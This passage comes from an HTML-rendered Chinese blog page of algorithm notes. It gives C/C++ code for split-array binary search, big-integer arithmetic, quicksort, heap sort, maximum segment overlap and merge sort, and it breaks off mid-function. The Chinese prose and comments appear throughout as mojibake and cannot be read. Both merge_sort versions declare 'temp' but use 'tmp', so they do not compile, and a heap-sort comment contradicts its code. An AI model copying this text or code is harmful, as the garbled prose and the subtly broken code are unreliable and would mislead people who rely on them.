href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><h5 id="åˆ†å‰²æ•°ç»„é—®é¢˜"><a href="#åˆ†å‰²æ•°ç»„é—®é¢˜" class="headerlink" title="åˆ†å‰²æ•°ç»„é—®é¢˜"></a>åˆ†å‰²æ•°ç»„é—®é¢˜</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">splitArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> m)</span> </span>&#123;<br>    <span class="hljs-type">int</span> left = *<span class="hljs-built_in">max_element</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// æ•°ç»„ä¸­çš„æœ€å¤§å€¼</span><br>    <span class="hljs-type">int</span> right = <span class="hljs-built_in">accumulate</span>(nums.<span class="hljs-built_in">begin</span>(), nums.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);  <span class="hljs-comment">// æ•°ç»„æ‰€æœ‰å…ƒç´ çš„å’Œ</span><br>    <span class="hljs-keyword">while</span> (left &lt; right) &#123;<br>        <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">canSplit</span>(nums, mid, m))<br>            right = mid;  <span class="hljs-comment">// å°è¯•å‡å°æœ€å¤§å€¼</span><br>        <span class="hljs-keyword">else</span><br>            left = mid + <span class="hljs-number">1</span>;  <span class="hljs-comment">// å¢å¤§æœ€å¤§å€¼</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canSplit</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> maxSum, <span class="hljs-type">int</span> m)</span> </span>&#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>, count = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>        sum += num;<br>        <span class="hljs-keyword">if</span> (sum &gt; maxSum) &#123;  <span class="hljs-comment">// å¦‚æœå½“å‰å­æ•°ç»„çš„å’Œè¶…è¿‡äº†å…è®¸çš„æœ€å¤§å€¼</span><br>            sum = num;<br>            count++;  <span class="hljs-comment">// åˆ’åˆ†å‡ºæ–°çš„å­æ•°ç»„</span><br>            <span class="hljs-keyword">if</span> (count &gt; m) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜ç²¾åº¦é—®é¢˜"><a href="#é«˜ç²¾åº¦é—®é¢˜" class="headerlink" title="é«˜ç²¾åº¦é—®é¢˜"></a>é«˜ç²¾åº¦é—®é¢˜</h3><h4 id="é«˜ç²¾åº¦åŠ æ³•"><a href="#é«˜ç²¾åº¦åŠ æ³•" class="headerlink" title="é«˜ç²¾åº¦åŠ æ³•"></a>é«˜ç²¾åº¦åŠ æ³•</h4><p>é•¿åº¦å¾ˆé•¿çš„æƒ…å†µä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">add</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, vector&lt;<span class="hljs-type">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (A.<span class="hljs-built_in">size</span>() &lt; B.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> <span class="hljs-built_in">add</span>(B, A);<br><br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++ )<br>    &#123;<br>        t += A[i];<br>        <span class="hljs-keyword">if</span> (i &lt; B.<span class="hljs-built_in">size</span>()) t += B[i];<br>        C.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (t) C.<span class="hljs-built_in">push_back</span>(t);<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="é«˜ç²¾åº¦å‡æ³•"><a href="#é«˜ç²¾åº¦å‡æ³•" class="headerlink" title="é«˜ç²¾åº¦å‡æ³•"></a>é«˜ç²¾åº¦å‡æ³•</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C = A - B, æ»¡è¶³A &gt;= B, A &gt;= 0, B &gt;= 0</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sub</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;A, vector&lt;<span class="hljs-type">int</span>&gt; &amp;B)</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i ++ )<br>    &#123;<br>        t = A[i] - t;<br>        <span class="hljs-keyword">if</span> (i &lt; B.<span class="hljs-built_in">size</span>()) t -= B[i];<br>        C.<span class="hljs-built_in">push_back</span>((t + <span class="hljs-number">10</span>) % <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (t &lt; <span class="hljs-number">0</span>) t = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> t = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (C.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; C.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) C.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="é«˜ç²¾åº¦ä¹˜ä½ç²¾åº¦"><a href="#é«˜ç²¾åº¦ä¹˜ä½ç²¾åº¦" class="headerlink" title="é«˜ç²¾åº¦ä¹˜ä½ç²¾åº¦"></a>é«˜ç²¾åº¦ä¹˜ä½ç²¾åº¦</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// C = A * b, A &gt;= 0, b &gt; 0</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">mul</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; &amp;A, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; C;<br>    <span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.size() || t; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; A.size()) t += A[i] * b;<br>        C.push_back(t % <span class="hljs-number">10</span>);<br>        t /= <span class="hljs-number">10</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="é«˜ç²¾åº¦é™¤ä»¥ä½ç²¾åº¦"><a href="#é«˜ç²¾åº¦é™¤ä»¥ä½ç²¾åº¦" class="headerlink" title="é«˜ç²¾åº¦é™¤ä»¥ä½ç²¾åº¦"></a>é«˜ç²¾åº¦é™¤ä»¥ä½ç²¾åº¦</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// A / b = C ... r, A &gt;= 0, b &gt; 0ï¼Œræ˜¯ä½™æ•°ä¸ç”¨èµ‹å€¼ç›´æ¥ä¼ å…¥å°±è¡Œ</span><br><span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">div</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; &amp;A, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> &amp;r)</span><br>&#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; C;<br>    r = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = A.size() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i -- )<br>    &#123;<br>        r = r * <span class="hljs-number">10</span> + A[i];<br>        C.push_back(r / b);<br>        r %= b;<br>    &#125;<br>    reverse(C.begin(), C.end());<br>    <span class="hljs-keyword">while</span> (C.size() &gt; <span class="hljs-number">1</span> &amp;&amp; C.back() == <span class="hljs-number">0</span>) C.pop_back();<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><p>+++++</p><h2 id="äºŒ-æ’åº"><a href="#äºŒ-æ’åº" class="headerlink" title="äºŒ.æ’åº"></a>äºŒ.æ’åº</h2><h3 id="å¿«é€Ÿæ’åº"><a href="#å¿«é€Ÿæ’åº" class="headerlink" title="å¿«é€Ÿæ’åº"></a>å¿«é€Ÿæ’åº</h3><ul><li><p>æ—¶é—´å¤æ‚åº¦ï¼šO(n log n)</p></li><li><p>ç©ºé—´å¤æ‚åº¦ï¼šO(log n)</p></li><li><p>ç¨³å®šæ€§ï¼šä¸ç¨³å®š</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">quick_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">int</span> i = l - <span class="hljs-number">1</span>, j = r + <span class="hljs-number">1</span>, x = q[l + r &gt;&gt; <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">while</span> (i &lt; j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i ++ ; <span class="hljs-keyword">while</span> (q[i] &lt; x);<br>        <span class="hljs-keyword">do</span> j -- ; <span class="hljs-keyword">while</span> (q[j] &gt; x);<br>        <span class="hljs-keyword">if</span> (i &lt; j) <span class="hljs-built_in">swap</span>(q[i], q[j]);<br>    &#125;<br>    <span class="hljs-built_in">quick_sort</span>(q, l, j), <span class="hljs-built_in">quick_sort</span>(q, j + <span class="hljs-number">1</span>, r);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æŠ€å·§</strong>ï¼šé€šè¿‡åˆ†æ²»æ³•å°†æ•°ç»„åˆ’åˆ†ä¸ºè¾ƒå°çš„å­æ•°ç»„ï¼Œé€’å½’æ’åºã€‚</p><p>è·å…°æ——é—®é¢˜â€”â€”â€”â€”åˆ’åˆ†ä¸¤ä¸ªåŒºåŸŸ</p><p>æµç¨‹1â€”â€”åˆ’åˆ†&gt;&lt;ä¸¤ä¸ªåŒºåŸŸï¼šå½“å‰æ•°&lt;&#x3D;ç›®æ ‡ï¼šå…ˆå’Œ&lt;&#x3D;åŒºä¸‹ä¸€ä¸ªä½ç½®äº¤æ¢ï¼Œç„¶å&lt;&#x3D;åŒºå‘å³æ‰©ï¼ŒæŒ‡é’ˆåç§»</p><p>â€‹   å½“å‰æ•°&gt;ç›®æ ‡ï¼šæŒ‡é’ˆç›´æ¥åç§»</p><p>æµç¨‹2â€”â€”åˆ’åˆ†&gt;&#x3D;&lt;ä¸‰ä¸ªåŒºåŸŸï¼šå½“å‰æ•°&lt;ç›®æ ‡ï¼šå…ˆå’Œ&lt;åŒºä¸‹ä¸€ä¸ªä½ç½®äº¤æ¢ï¼Œç„¶å&lt;åŒºå‘å³æ‰©ï¼ŒæŒ‡é’ˆåç§»</p><p>â€‹  å½“å‰æ•°&#x3D;&#x3D;ç›®æ ‡ï¼šæŒ‡é’ˆç›´æ¥åç§»</p><p>â€‹  å½“å‰æ•°&gt;ç›®æ ‡ï¼šå…ˆå’Œ&gt;åŒºçš„å‰ä¸€ä¸ªæ•°äº¤æ¢ï¼Œç„¶å&gt;åŒºå‘å·¦æ‰©ï¼Œ æŒ‡é’ˆä¸è¦åŠ¨</p><p>â€‹</p><h3 id="å †æ’åº"><a href="#å †æ’åº" class="headerlink" title="å †æ’åº"></a>å †æ’åº</h3><p>å †å°±æ˜¯ <code>å®Œå…¨äºŒå‰æ ‘</code>+<code>æ»¡è¶³å¤§æ ¹æˆ–å°æ ¹çš„ç»“æ„</code>(ä¸€ä»£ä¸å¦‚ä¸€ä»£ï¼Œè¶Šæ¥è¶Šå¼ºçš„ä¸€ä»£)</p><p>æˆ‘ä»¬ç”±æ•°ç»„è„‘è¡¥å‡ºå®Œå…¨äºŒå‰æ ‘çš„ç»“æ„ï¼Œå †åªæœ‰å‘ä¸Šè°ƒæ•´å’Œå‘ä¸‹è°ƒæ•´ä¸¤ç§ç®—æ³•</p><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n log n)</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)</li><li>ç¨³å®šæ€§ï¼šä¸ç¨³å®š</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heap_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[], <span class="hljs-type">int</span> n)</span> </span>&#123;<br>    priority_queue&lt;<span class="hljs-type">int</span>&gt; q;<br>    <span class="hljs-comment">// å°†æ‰€æœ‰å…ƒç´ å‹å…¥å †ä¸­ï¼Œå½¢æˆä¸€ä¸ªæœ€å¤§å †</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        q.<span class="hljs-built_in">push</span>(-a[i]);  <span class="hljs-comment">// ä½¿ç”¨è´Ÿå€¼æ¥æ¨¡æ‹Ÿæœ€å°å †</span><br>    &#125;<br>    <span class="hljs-comment">// å°†å †ä¸­çš„å…ƒç´ ä¾æ¬¡å¼¹å‡ºï¼Œå¾—åˆ°æœ‰åºåºåˆ—</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        a[i] = -q.<span class="hljs-built_in">top</span>();  <span class="hljs-comment">// å–å‡ºæœ€å°å€¼å¹¶å­˜å…¥æ•°ç»„</span><br>        q.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æŠ€å·§</strong>ï¼šåˆ©ç”¨å †ç»“æ„ç»´æŠ¤æœ€å¤§æˆ–æœ€å°å †ã€‚</p><p>æœ€å¤§çº¿æ®µé‡åˆé—®é¢˜</p><p>ç»™å®šå¾ˆå¤šçº¿æ®µï¼Œæ¯ä¸ªçº¿æ®µéƒ½æœ‰ä¸¤ä¸ªæ•°[start,end]è¡¨ç¤ºçº¿æ®µå¼€å§‹ä½ç½®å’Œç»“æŸä½ç½®ï¼Œå·¦å³éƒ½æ˜¯é—­åŒºé—´è§„å®šï¼š<br>1)çº¿æ®µçš„å¼€å§‹å’Œç»“æŸä½ç½®ä¸€å®šéƒ½æ˜¯æ•´æ•°å€¼<br>2)çº¿æ®µé‡åˆåŒºåŸŸçš„é•¿åº¦å¿…é¡»&gt;&#x3D;1<br>è¿”å›çº¿æ®µæœ€å¤šé‡åˆåŒºåŸŸä¸­ï¼ŒåŒ…å«äº†å‡ æ¡çº¿æ®µ</p><p>æµç¨‹å‡†å¤‡ä¸€ä¸ªå°æ ¹å †ï¼Œå°†æ‰€æœ‰çº¿æ®µä»¥ç¬¬ä¸€ä¸ªæ•°çš„å¤§å°ä»å°åˆ°å¤§æ’åºè¿™äº›çº¿æ®µï¼Œå¼€å§‹æ‰§è¡Œï¼šç¬¬ä¸€ä¸ªçº¿æ®µå°†äºŒä½ç½®æ”¾å…¥å †ä¸­ï¼Œå½“å°æ ¹å †é‡Œæœ‰å°äºç­‰äºæ­¤çº¿æ®µç¬¬ä¸€ä¸ªæ•°æ—¶ï¼ŒæŠŠä»–å–å‡ºï¼Œç„¶åå°†çº¿æ®µç¬¬äºŒä¸ªæ•°pushè¿›å †é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LineSegment</span> &#123;</span><br>    <span class="hljs-type">int</span> start;<br>    <span class="hljs-type">int</span> end;<br>&#125;;<br><br><span class="hljs-comment">// æ¯”è¾ƒå‡½æ•°ï¼šæŒ‰ start å‡åºæ’åˆ—</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">compareByStart</span><span class="hljs-params">(<span class="hljs-type">const</span> LineSegment&amp; a, <span class="hljs-type">const</span> LineSegment&amp; b)</span> &#123;<br>    <span class="hljs-keyword">return</span> a.start &lt; b.start;  <span class="hljs-comment">// è¿”å› true è¡¨ç¤º a æ’åœ¨å‰é¢</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxOverlapSegments</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;LineSegment&gt;&amp; segments)</span> &#123;<br>    <span class="hljs-keyword">if</span> (segments.empty()) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 1. å°†æ‰€æœ‰çº¿æ®µæŒ‰ start æ’åº</span><br>    sort(segments.begin(), segments.end(), compareByStart);<br>    <span class="hljs-comment">// 2. å°æ ¹å †ç”¨äºå­˜å‚¨çº¿æ®µçš„ç»“æŸä½ç½®ï¼ˆendï¼‰</span><br>    <span class="hljs-built_in">priority_queue</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;, greater&lt;<span class="hljs-type">int</span>&gt;&gt; pq;<br>    <span class="hljs-comment">// 3. åˆå§‹åŒ–æœ€å¤§é‡å æ•°</span><br>    <span class="hljs-type">int</span> maxOverlap = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 4. éå†æ‰€æœ‰çº¿æ®µ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; segment : segments) &#123;<br>        <span class="hljs-comment">// å–å‡ºæ‰€æœ‰ç»“æŸä½ç½®å°äºç­‰äºå½“å‰çº¿æ®µèµ·å§‹ä½ç½®çš„çº¿æ®µ</span><br>        <span class="hljs-keyword">while</span> (!pq.empty() &amp;&amp; pq.top() &lt;= segment.start) &#123;<br>            pq.pop();  <span class="hljs-comment">// è¿™äº›çº¿æ®µä¸å†é‡å </span><br>        &#125;<br>        <span class="hljs-comment">// å°†å½“å‰çº¿æ®µçš„ç»“æŸä½ç½®åŠ å…¥å †</span><br>        pq.push(segment.end);<br>        <span class="hljs-comment">// è®°å½•å †ä¸­å½“å‰çš„çº¿æ®µæ•°ï¼Œå³å½“å‰é‡å çš„çº¿æ®µæ•°</span><br>        maxOverlap = max(maxOverlap, (<span class="hljs-type">int</span>)pq.size());<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxOverlap;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;LineSegment&gt; segments = &#123; &#123;<span class="hljs-number">1</span>, <span class="hljs-number">4</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">6</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">7</span>&#125;, &#123;<span class="hljs-number">5</span>, <span class="hljs-number">8</span>&#125; &#125;;<br>    <span class="hljs-type">int</span> result = maxOverlapSegments(segments);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;æœ€å¤§é‡å çš„çº¿æ®µæ•°: &quot;</span> &lt;&lt; result &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="å½’å¹¶æ’åº"><a href="#å½’å¹¶æ’åº" class="headerlink" title="å½’å¹¶æ’åº"></a>å½’å¹¶æ’åº</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n log n)</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(n)</li><li>ç¨³å®šæ€§ï¼šç¨³å®š</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span>&#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span>;<br>    <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">merge_sort</span>(q, l, mid);<br>    <span class="hljs-built_in">merge_sort</span>(q, mid + <span class="hljs-number">1</span>, r);<br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>        <span class="hljs-keyword">if</span> (q[i] &lt; q[j]) tmp[k ++ ] = q[i ++ ];<br>        <span class="hljs-keyword">else</span> tmp[k ++ ] = q[j ++ ];<br>    <span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];<br>    <span class="hljs-keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];<br>    <span class="hljs-keyword">for</span> (i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨åˆå¹¶çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥ <strong>æ’åº</strong>ï¼Œè¿˜å¯ä»¥ <strong>ç»Ÿè®¡</strong> æ•°ç»„ä¸­å…ƒç´ ä¹‹é—´çš„å…³ç³»,åœ¨æ¯å±‚mergeå‰ç»Ÿè®¡å…³ç³»</p><h4 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h4><h5 id="å°å’Œé—®é¢˜"><a href="#å°å’Œé—®é¢˜" class="headerlink" title="å°å’Œé—®é¢˜"></a>å°å’Œé—®é¢˜</h5><p>ç»Ÿè®¡å·¦é¢æœ‰å¤šå°‘æ•°æ¯”æœ¬èº«å°ç´¯åŠ èµ·æ¥</p><p>mergeè¿‡ç¨‹ä¸­è®¾ç½®ä¸€ä¸ªansï¼Œå½“å·¦ç»„æ‹·è´æ—¶ans+å³ç»„æŒ‡é’ˆåˆ°ç»“å°¾çš„æ•°çš„ä¸ªæ•°*æ‹·è´çš„æ•°ï¼Œç›¸ç­‰æ—¶å…ˆæ‹·è´å³è¾¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">merge_sort</span><span class="hljs-params">(<span class="hljs-type">int</span> q[], <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span>&#123;<br>    <span class="hljs-type">int</span> temp[<span class="hljs-number">1000</span>];<br>    <span class="hljs-keyword">if</span> (l &gt;= r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> mid = l + r &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    res += merge_sort(q, l, mid);<br>    res += merge_sort(q, mid + <span class="hljs-number">1</span>, r);<br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>, i = l, j = mid + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>        <span class="hljs-keyword">if</span> (q[i] &lt; q[j])&#123;     <br>            tmp[k ++ ] = q[i ++ 